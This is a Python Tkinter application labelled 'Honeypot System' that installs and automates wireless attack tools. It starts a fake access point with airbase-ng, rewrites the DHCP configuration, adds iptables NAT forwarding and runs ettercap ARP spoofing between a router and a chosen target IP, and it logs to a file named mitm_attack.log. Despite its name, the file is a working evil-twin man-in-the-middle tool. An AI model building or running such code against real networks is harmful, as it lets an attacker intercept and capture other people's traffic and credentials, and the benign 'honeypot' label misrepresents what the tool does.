import os
import subprocess
import datetime
import tkinter as tk
from tkinter import messagebox, ttk, simpledialog

log_file = "/var/log/mitm_attack.log"

# Function to log activities to the log file
def log_activity(message):
    with open(log_file, "a") as log:
        log.write(f"{datetime.datetime.now()} - {message}\n")

# Function to update status in the GUI
def update_status(message):
    app.status_text.insert(tk.END, message + '\n')
    app.status_text.see(tk.END)  # Scroll to the end

# Function to analyze network activity using Wireshark
def analyze_network_activity():
    log_activity("Starting network activity analysis using Wireshark.")
    capture_file = "/tmp/network_capture.pcap"
    result = subprocess.run(['sudo', 'wireshark', '-i', 'wlan0', '-k', '-w', capture_file], capture_output=True, text=True)
    update_status("Network data has been saved to {}".format(capture_file))
    update_status(result.stdout)
    if result.stderr:
        update_status(result.stderr)

# Function to install tools if missing
def install_if_missing(tool, package_name):
    result = subprocess.run(['which', tool], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    if result.returncode != 0:
        update_status(f"Installing {tool}...")
        install_result = subprocess.run(['sudo', 'apt-get', 'install', '-y', package_name], capture_output=True, text=True)
        update_status(install_result.stdout)
        if install_result.stderr:
            update_status(install_result.stderr)

# Install required tools
def install_tools():
    install_if_missing('airbase-ng', 'aircrack-ng')
    install_if_missing('isc-dhcp-server', 'isc-dhcp-server')
    install_if_missing('iptables', 'iptables')
    install_if_missing('ettercap', 'ettercap-text-only')
    install_if_missing('wireshark', 'wireshark')
    update_status("All required tools have been installed.")

# Set up the fake access point using Airbase-ng
def start_airbase_ng(interface, name):
    result = subprocess.run(['sudo', 'airbase-ng', '-e', name, '-c', '6', interface], capture_output=True, text=True)
    log_activity(f"Fake access point set up using Airbase-ng on {interface}.")
    update_status(f"Fake access point set up using Airbase-ng on {interface}.")
    update_status(result.stdout)
    if result.stderr:
        update_status(result.stderr)

# Set up the DHCP server
def setup_dhcp_server(subnet, ip_range, router):
    dhcp_config = f"""
    subnet {subnet} netmask 255.255.255.0 {{
        range {ip_range};
        option routers {router};
        option domain-name-servers 8.8.8.8, 8.8.4.4;
    }}
    """
    with open("/etc/dhcp/dhcpd.conf", "w") as dhcp_file:
        dhcp_file.write(dhcp_config)
    result = subprocess.run(["sudo", "systemctl", "restart", "isc-dhcp-server"], capture_output=True, text=True)
    log_activity("DHCP Server has been set up.")
    update_status("DHCP Server has been set up successfully.")
    update_status(result.stdout)
    if result.stderr:
        update_status(result.stderr)

# Set up IPTables firewall
def setup_iptables():
    result_nat = subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING", "-o", "eth0", "-j", "MASQUERADE"], capture_output=True, text=True)
    result_forward1 = subprocess.run(["sudo", "iptables", "-A", "FORWARD", "-i", "wlan0", "-o", "eth0", "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"], capture_output=True, text=True)
    result_forward2 = subprocess.run(["sudo", "iptables", "-A", "FORWARD", "-i", "eth0", "-o", "wlan0", "-j", "ACCEPT"], capture_output=True, text=True)
    
    log_activity("IPTables has been set up.")
    update_status("IPTables has been set up successfully.")
    update_status(result_nat.stdout)
    update_status(result_forward1.stdout)
    update_status(result_forward2.stdout)
    if result_nat.stderr:
        update_status(result_nat.stderr)
    if result_forward1.stderr:
        update_status(result_forward1.stderr)
    if result_forward2.stderr:
        update_status(result_forward2.stderr)

# Run Ettercap to intercept data
def start_ettercap(interface, router_ip, target_ip):
    result = subprocess.run(["ettercap", "-T", "-q", "-i", interface, "-M", "arp:remote", f"/{router_ip}//", f"/{target_ip}//"], capture_output=True, text=True)
    log_activity(f"Ettercap started to intercept data on {interface}.")
    update_status(f"Ettercap started to intercept data on {interface}.")
    update_status(result.stdout)
    if result.stderr:
        update_status(result.stderr)

# Class for the GUI application
class HoneypotApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Honeypot System - Version 1.0")
        self.root.geometry("800x600")
        self.root.configure(bg='#2C2C2C')

        # Toolbar
        self.toolbar = tk.Frame(self.root, bg='#F5F5F5', relief=tk.RAISED, bd=0)
        self.toolbar.pack(side=tk.TOP, fill=tk.X)

        # Toolbar buttons
        self.create_toolbar_button("Install Tools", install_tools)
        self.create_toolbar_button("Analyze Network Activity", analyze_network_activity)

        # Title label
        title_label = tk.Label(self.root, text="Honeypot System", font=('Arial', 24, 'bold'), bg='#F5F5F5', fg='#333333')
        title_label.pack(pady=(20, 10))

        # Frame for selecting tool
        self.tool_frame = ttk.LabelFrame(self.root, text='Select Tool', padding=(20, 10), relief=tk.GROOVE)
        self.tool_frame.pack(pady=10)

        self.selected_tool = tk.StringVar(value='Select Tool')
        self.tool_dropdown = ttk.Combobox(self.tool_frame, textvariable=self.selected_tool, state='readonly')
        
        # أدوات مرتبة
        self.tool_dropdown['values'] = [
            'Airbase-ng',
            'DHCP Server',
            'Iptables',
            'Ettercap'
        ]
        
        self.tool_dropdown.pack(pady=5)

        # Create main buttons
        self.create_button("Run Selected Tool", self.run_selected_tool)
        self.create_button("Start All Tools in Sequence", self.start_all_tools)  # زر بدء جميع الأدوات
        self.create_button("Exit", root.quit)

        # Status frame to display ongoing actions
        self.status_frame = ttk.LabelFrame(self.root, text='Status', padding=(20, 10), relief=tk.GROOVE)
        self.status_frame.pack(pady=10, fill=tk.BOTH, expand=True)

        self.status_text = tk.Text(self.status_frame, height=10, width=70, wrap=tk.WORD, bg='#F0F0F0', font=('Arial', 12))
        self.status_text.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)

        # Set the style for the buttons
        self.setup_styles()

    def create_toolbar_button(self, text, command):
        """Create a button in the toolbar."""
        button = ttk.Button(self.toolbar, text=text, command=command, style='ToolbarButton.TButton')
        button.pack(side=tk.LEFT, padx=5, pady=5)

    def create_button(self, text, command):
        """Create a main button with specified text and command."""
        button = ttk.Button(self.tool_frame, text=text, command=command, style='MainButton.TButton')
        button.pack(pady=5, padx=5, fill=tk.X)

    def setup_styles(self):
        """Set up styles for the application."""
        style = ttk.Style()
        style.configure('ToolbarButton.TButton', font=('Arial', 12, 'bold'), padding=10, background='#2C2C2C', foreground='white', borderwidth=0)
        style.configure('MainButton.TButton', font=('Arial', 14, 'bold'), padding=10, background='#2C2C2C', foreground='white', borderwidth=0)

    def run_selected_tool(self):
        # Get the selected tool from the dropdown
        tool = self.selected_tool.get()

        # Get parameters based on selected tool
        if tool == 'Airbase-ng':
            interface = simpledialog.askstring("Input", "Enter Network Interface (e.g., wlan0):")
            name = simpledialog.askstring("Input", "Enter Fake Network Name:")
            if interface and name:
                start_airbase_ng(interface, name)
        
        elif tool == 'DHCP Server':
            subnet = simpledialog.askstring("Input", "Enter Subnet (e.g., 192.168.1.0):")
            ip_range = simpledialog.askstring("Input", "Enter IP Range (e.g., 192.168.1.10,192.168.1.100):")
            router = simpledialog.askstring("Input", "Enter Router IP:")
            if subnet and ip_range and router:
                setup_dhcp_server(subnet, ip_range, router)

        elif tool == 'Iptables':
            setup_iptables()

        elif tool == 'Ettercap':
            interface = simpledialog.askstring("Input", "Enter Network Interface (e.g., wlan0):")
            router = simpledialog.askstring("Input", "Enter Router IP:")
            target_ip = simpledialog.askstring("Input", "Enter Target IP:")
            if interface and router and target_ip:
                start_ettercap(interface, router, target_ip)

    def start_all_tools(self):
        # Start each tool in sequence
        update_status("Starting all tools in sequence...")
        
        # Airbase-ng
        interface = simpledialog.askstring("Input", "Enter Network Interface for Airbase-ng (e.g., wlan0):")
        name = simpledialog.askstring("Input", "Enter Fake Network Name for Airbase-ng:")
        if interface and name:
            start_airbase_ng(interface, name)
            update_status("Airbase-ng started.")

        # DHCP Server
        subnet = simpledialog.askstring("Input", "Enter Subnet (e.g., 192.168.1.0):")
        ip_range = simpledialog.askstring("Input", "Enter IP Range (e.g., 192.168.1.10,192.168.1.100):")
        router = simpledialog.askstring("Input", "Enter Router IP:")
        if subnet and ip_range and router:
            setup_dhcp_server(subnet, ip_range, router)
            update_status("DHCP Server started.")

        # IPTables
        setup_iptables()
        update_status("IPTables configured.")

        # Ettercap
        interface = simpledialog.askstring("Input", "Enter Network Interface for Ettercap (e.g., wlan0):")
        router_ip = simpledialog.askstring("Input", "Enter Router IP for Ettercap:")
        target_ip = simpledialog.askstring("Input", "Enter Target IP for Ettercap:")
        if interface and router_ip and target_ip:
            start_ettercap(interface, router_ip, target_ip)
            update_status("Ettercap started.")

# Run the application
if __name__ == '__main__':
    root = tk.Tk()
    app = HoneypotApp(root)
    root.mainloop()
